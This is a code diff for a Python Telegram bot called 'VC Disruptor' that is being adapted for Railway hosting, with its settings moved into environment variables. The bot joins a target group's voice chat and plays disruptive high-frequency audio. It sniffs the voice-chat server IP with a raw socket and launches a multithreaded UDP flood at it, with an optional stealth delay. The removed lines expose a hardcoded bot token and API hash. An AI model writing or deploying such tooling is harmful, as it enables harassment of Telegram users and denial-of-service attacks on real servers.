@@ -19,20 +19,14 @@ from telethon.errors import FloodWaitError
 from pytgcalls import PyTgCalls
 from pytgcalls.types import AudioPiped
 
-# ═══════════════════════════════════════════════════
-# CONFIGURATION - 🔴 YAHAN CHANGE KAREIN
-# ═══════════════════════════════════════════════════
+# ========== CONFIGURATION (from ENV) ==========
+BOT_TOKEN = None  # Not used (we use user account)
+OWNER_ID = int(os.environ.get("OWNER_ID", 0))
+API_ID = int(os.environ.get("API_ID", 0))
+API_HASH = os.environ.get("API_HASH", "")
+SESSION_STRING = os.environ.get("SESSION_STRING", "")
 
-BOT_TOKEN = "8524730431:AAGORdQFDXoDWtb6oeVD41aRBCd3x6YLNKQ"
-OWNER_ID = 7302427268
-
-# 🔴🔴🔴 APNA SESSION_STRING YAHAN DAALO 🔴🔴🔴
-SESSION_STRING = "BQAN3s...apna_session_string..."
-
-# Bot Account Credentials (User Account)
-API_ID = 6
-API_HASH = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
-
+# Default values (can be overridden via /set)
 AUDIO_DURATION = 20
 AUDIO_AMPLITUDE = 0.95
 TONE_FREQUENCY = 8500
@@ -49,7 +43,7 @@ TELEGRAM_PREFIXES = [
     "95.161.76.", "95.161.64."
 ]
 
-# ═══════════════════════════════════════════════════
+# ===============================================
 
 bot_state = {
     "target_id": None,
@@ -81,7 +75,7 @@ def save_bot_config():
 def load_bot_config():
     global AUDIO_DURATION, AUDIO_AMPLITUDE, TONE_FREQUENCY
     global UDP_THREADS, UDP_DURATION, STEALTH_MODE
-    
+
     if os.path.exists(CONFIG_FILE):
         try:
             with open(CONFIG_FILE, "r") as f:
@@ -96,19 +90,20 @@ def load_bot_config():
             STEALTH_MODE = data.get("stealth_mode", STEALTH_MODE)
             print("[✓] Config loaded.")
         except:
-            print("[!] Config corrupted.")
+            print("[!] Config corrupted, using defaults.")
 
 def detect_vc_ip(duration=15):
     print(f"[🔍] Detecting VC IP ({duration}s)...")
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
         sock.settimeout(1)
-    except:
+    except Exception as e:
+        print(f"[!] Raw socket not available: {e}")
         return None, None
-    
+
     ips = {}
     start = time.time()
-    
+
     while time.time() - start < duration:
         try:
             packet = sock.recvfrom(65536)[0]
@@ -117,7 +112,7 @@ def detect_vc_ip(duration=15):
             src_ip = socket.inet_ntoa(iph[8])
             dst_ip = socket.inet_ntoa(iph[9])
             protocol = iph[6]
-            
+
             if protocol == 17:
                 udp_header = packet[20:28]
                 src_port, dst_port = struct.unpack('!HH', udp_header[:4])
@@ -131,7 +126,7 @@ def detect_vc_ip(duration=15):
                             break
         except:
             continue
-    
+
     sock.close()
     if ips:
         best_ip = max(ips, key=ips.get)
@@ -142,6 +137,7 @@ def detect_vc_ip(duration=15):
 def udp_flood_worker(ip, port, duration, tid, stop_event):
     sent = 0
     try:
+        # Use SOCK_DGRAM (no raw needed) – works without root but less effective
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         timeout = time.time() + duration
         while time.time() < timeout and not stop_event.is_set():
@@ -200,8 +196,7 @@ def generate_disruptive_audio(duration_sec=AUDIO_DURATION,
     buf.seek(0)
     return buf
 
-# ─── BOT HANDLERS (Telethon) ───
-
+# ---------- BOT HANDLERS ----------
 def owner_only(func):
     async def wrapper(event):
         try:
@@ -217,7 +212,7 @@ def owner_only(func):
 @owner_only
 async def start_cmd(event):
     text = """
-🤖 **VC Disruptor Bot (Telethon)**
+🤖 **VC Disruptor Bot (Telethon) - Railway Edition**
 
 🎯 `/target <link>` — Set target group
 ⚔️ `/attack` — Start attack
@@ -249,16 +244,15 @@ async def target_cmd(event):
     if len(parts) < 2:
         await event.reply("❌ Usage: /target <group_link_or_id>")
         return
-    
+
     link = parts[1].strip()
     await event.reply(f"[🔗] Processing: {link}")
-    
+
     try:
         app = bot_state["app"]
-        
+
         if link.startswith("http") or link.startswith("t.me"):
             try:
-                # Join private group
                 if "t.me/+" in link:
                     hash_code = link.split("/")[-1]
                     await app(ImportChatInviteRequest(hash_code))
@@ -269,19 +263,16 @@ async def target_cmd(event):
                 await event.reply(f"[!] Flood wait: {e.seconds}s")
                 return
             except:
-                # Already member, just get chat
                 username = link.split("/")[-1]
                 chat = await app.get_entity(username)
         else:
-            # Direct ID
             chat = await app.get_entity(int(link))
-        
-        # Store target info
+
         bot_state["target_id"] = chat.id
         bot_state["target_name"] = chat.title if hasattr(chat, 'title') else str(chat.id)
         bot_state["status"] = "target_set"
         save_bot_config()
-        
+
         await event.reply(f"[✅] Target: **{bot_state['target_name']}**\nID: `{chat.id}`")
     except Exception as e:
         await event.reply(f"[!] Error: {e}")
@@ -291,55 +282,59 @@ async def attack_cmd(event):
     if bot_state["is_attacking"]:
         await event.reply("⚠️ Attack already running!")
         return
-    
+
     if not bot_state["target_id"]:
         await event.reply("❌ No target set! Use /target first.")
         return
-    
+
     chat_id = bot_state["target_id"]
     await event.reply(f"🚀 **Attacking {bot_state['target_name']}...**")
-    
+
     bot_state["is_attacking"] = True
     bot_state["status"] = "attacking"
     bot_state["attack_start"] = time.time()
-    
+
     stop_event = threading.Event()
     bot_state["stop_event"] = stop_event
-    
+
     try:
         await event.reply("[🔍] Detecting VC IP (15s)...")
         vc_ip, vc_port = detect_vc_ip(15)
         bot_state["vc_ip"] = vc_ip
-        
+
         audio_buf = generate_disruptive_audio()
-        
+
         if STEALTH_MODE:
             await asyncio.sleep(random.uniform(2, 5))
-        
+
         pytgcalls = bot_state["pytgcalls"]
-        
+
         await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
         await event.reply(f"[✅] Audio playing for {AUDIO_DURATION}s")
-        
+
         if vc_ip and vc_port:
-            threading.Thread(
-                target=lambda: start_udp_flood(vc_ip, vc_port, UDP_DURATION, UDP_THREADS, stop_event),
-                daemon=True
-            ).start()
-            await event.reply(f"[🌊] UDP flood: {vc_ip}:{vc_port}")
-        
+            # UDP flood will run in background; if it fails, we ignore.
+            try:
+                threading.Thread(
+                    target=lambda: start_udp_flood(vc_ip, vc_port, UDP_DURATION, UDP_THREADS, stop_event),
+                    daemon=True
+                ).start()
+                await event.reply(f"[🌊] UDP flood started: {vc_ip}:{vc_port}")
+            except Exception as e:
+                await event.reply(f"[⚠️] UDP flood failed: {e}")
+
         await asyncio.sleep(AUDIO_DURATION + 2)
-        
+
         try:
             await pytgcalls.leave_group_call(chat_id)
         except:
             pass
-        
+
         stop_udp_flood(stop_event)
-        
+
         elapsed = int(time.time() - bot_state["attack_start"])
         await event.reply(f"[✅] Attack complete! Duration: {elapsed}s")
-        
+
     except Exception as e:
         await event.reply(f"[❌] Error: {e}")
     finally:
@@ -351,15 +346,15 @@ async def stop_cmd(event):
     if not bot_state["is_attacking"]:
         await event.reply("ℹ️ No active attack.")
         return
-    
+
     if bot_state.get("stop_event"):
         stop_udp_flood(bot_state["stop_event"])
-    
+
     try:
         await bot_state["pytgcalls"].leave_group_call(bot_state["target_id"])
     except:
         pass
-    
+
     bot_state["is_attacking"] = False
     bot_state["status"] = "idle"
     bot_state["stop_event"] = None
@@ -385,12 +380,12 @@ async def set_cmd(event):
     if len(parts) < 3:
         await event.reply("❌ Usage: /set <param> <value>\nExample: /set duration 30")
         return
-    
+
     param = parts[1].lower()
     value = parts[2]
-    
+
     global AUDIO_DURATION, UDP_DURATION, UDP_THREADS, TONE_FREQUENCY, STEALTH_MODE
-    
+
     changes = {
         "duration": ("AUDIO_DURATION", lambda v: max(5, int(v))),
         "udp_duration": ("UDP_DURATION", lambda v: max(5, int(v))),
@@ -398,7 +393,7 @@ async def set_cmd(event):
         "tone": ("TONE_FREQUENCY", lambda v: max(3000, min(15000, int(v)))),
         "stealth": ("STEALTH_MODE", lambda v: v.lower() in ("true", "yes", "1")),
     }
-    
+
     if param in changes:
         var_name, converter = changes[param]
         try:
@@ -427,21 +422,44 @@ async def reset_cmd(event):
         os.remove(CONFIG_FILE)
     await event.reply("[✅] Reset to defaults.")
 
-# ─── MAIN ───
+# ---------- KEEP-ALIVE WEB SERVER ----------
+# Railway requires the app to bind to a port, so we run a tiny HTTP server.
+async def web_server():
+    from aiohttp import web
 
+    async def handle(request):
+        return web.Response(text="Bot is running!")
+
+    app_web = web.Application()
+    app_web.router.add_get('/', handle)
+    runner = web.AppRunner(app_web)
+    await runner.setup()
+    site = web.TCPSite(runner, host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
+    await site.start()
+    print(f"[🌐] Keep-alive web server running on port {os.environ.get('PORT', 8080)}")
+    # Keep the server alive indefinitely
+    await asyncio.Event().wait()  # wait forever
+
+# ---------- MAIN ----------
 async def main():
     print("\n" + "="*50)
-    print("  🚀 VC DISRUPTOR BOT (Telethon)")
+    print("  🚀 VC DISRUPTOR BOT (Railway Edition)")
     print("="*50 + "\n")
-    
-    load_bot_config()
-    
-    if SESSION_STRING == "BQAN3s...apna_session_string...":
-        print("[!] ERROR: SESSION_STRING change karo!")
-        print("[!] @SessionStringBot se lo")
+
+    # Validate env vars
+    if not SESSION_STRING:
+        print("[!] ERROR: SESSION_STRING environment variable not set!")
         sys.exit(1)
-    
-    # Telethon Client (User Account)
+    if not API_ID or not API_HASH:
+        print("[!] ERROR: API_ID and API_HASH must be set!")
+        sys.exit(1)
+    if not OWNER_ID:
+        print("[!] ERROR: OWNER_ID must be set!")
+        sys.exit(1)
+
+    load_bot_config()
+
+    # Telethon Client
     print("[📡] Starting user account (Telethon)...")
     app = TelegramClient(
         "vc_session",
@@ -452,54 +470,58 @@ async def main():
     await app.start()
     user = await app.get_me()
     print(f"[👤] Logged in as: {user.first_name} (ID: {user.id})")
-    
-    # PyTgCalls with Telethon
+
+    # PyTgCalls
     print("[📞] Starting PyTgCalls...")
     pytgcalls = PyTgCalls(app)
     await pytgcalls.start()
     print("[✅] PyTgCalls ready!")
-    
+
     bot_state["app"] = app
     bot_state["pytgcalls"] = pytgcalls
-    
-    # Register Telethon handlers
+
+    # Register handlers
     @app.on(events.NewMessage(pattern='/start'))
     async def start_handler(event):
         await start_cmd(event)
-    
+
     @app.on(events.NewMessage(pattern='/status'))
     async def status_handler(event):
         await status_cmd(event)
-    
+
     @app.on(events.NewMessage(pattern='/target'))
     async def target_handler(event):
         await target_cmd(event)
-    
+
     @app.on(events.NewMessage(pattern='/attack'))
     async def attack_handler(event):
         await attack_cmd(event)
-    
+
     @app.on(events.NewMessage(pattern='/stop'))
     async def stop_handler(event):
         await stop_cmd(event)
-    
+
     @app.on(events.NewMessage(pattern='/settings'))
     async def settings_handler(event):
         await settings_cmd(event)
-    
+
     @app.on(events.NewMessage(pattern='/set'))
     async def set_handler(event):
         await set_cmd(event)
-    
+
     @app.on(events.NewMessage(pattern='/reset'))
     async def reset_handler(event):
         await reset_cmd(event)
-    
+
     print("\n" + "="*50)
     print("  ✅ BOT IS RUNNING!")
     print("  Commands: /target, /attack, /stop")
     print("="*50 + "\n")
-    
+
+    # Start the web server for keep-alive
+    asyncio.create_task(web_server())
+
+    # Run the bot until disconnected
     try:
         await app.run_until_disconnected()
     except KeyboardInterrupt:
